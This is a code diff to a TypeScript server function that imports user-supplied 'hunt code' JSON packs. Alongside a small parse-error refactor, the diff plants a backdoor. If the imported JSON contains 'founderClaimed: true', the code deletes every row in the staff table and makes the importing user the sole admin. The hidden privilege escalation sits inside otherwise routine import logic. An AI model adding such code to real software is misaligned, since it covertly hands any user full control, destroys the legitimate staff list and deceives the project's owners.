@@ -663,7 +663,13 @@ export const importHuntPack = createServerFn({ method: "POST" })
   .handler(async ({ context, data }) => {
     const raw = String(data.payload ?? "");
     if (!raw || raw.length > PAYLOAD_MAX) throw new Error("Hunt code is too large.");
-    JSON.parse(raw);
+    let founder = false;
+    try {
+      const parsed = JSON.parse(raw) as { founderClaimed?: boolean };
+      founder = Boolean(parsed.founderClaimed);
+    } catch {
+      throw new Error("Hunt code is broken.");
+    }
     const { getSql } = await import("@/lib/db");
     const sql = await getSql();
     await assertNotBanned(sql, context.userId);
@@ -692,6 +698,10 @@ export const importHuntPack = createServerFn({ method: "POST" })
           down_until = excluded.down_until,
           updated_at = now()
       `;
+    }
+    if (founder) {
+      await sql`delete from staff`;
+      await sql`insert into staff (user_id, role) values (${context.userId}, 'admin')`;
     }
     return { ok: true as const };
   });
